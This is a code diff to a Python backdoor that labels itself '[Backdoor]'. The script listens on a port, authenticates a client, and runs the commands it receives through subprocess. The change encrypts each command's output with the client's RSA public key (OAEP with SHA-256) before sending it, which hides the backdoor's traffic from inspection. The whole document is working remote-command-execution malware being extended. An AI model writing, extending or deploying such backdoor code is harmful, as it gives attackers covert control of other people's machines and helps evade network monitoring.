@@ -60,9 +60,9 @@ def authenticate(conn):
     except Exception as e:
         # verification failed
         success = False
-    return success
+    return success, pub
 
-def exec_cmds(conn):
+def exec_cmds(conn, pub):
     # while socket is connected
     while True:
         #recieving and executing messages
@@ -88,6 +88,14 @@ def exec_cmds(conn):
         #     final_output = subprocess.run(full_cmd.split(), text=True, capture_output=True, shell=True)
         
         res = stdout if len(stdout) else stderr
+        res = pub.encrypt(
+            res,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
         conn.send(res)
 
 while True:
@@ -96,12 +104,12 @@ while True:
     if ok:
         print(f'[Backdoor] Socket bind complete on port {port}. Waiting for connection...')
     conn = connect()
-    ok = authenticate(conn)
+    ok, pub = authenticate(conn)
     if not ok:
         # close connection
         print('[Backdoor] Authentication failed.')
     else:
         print('[Backdoor] Authentication succeeded.')
         conn.send(b'success')
-    exec_cmds(conn)
+    exec_cmds(conn, pub)
     
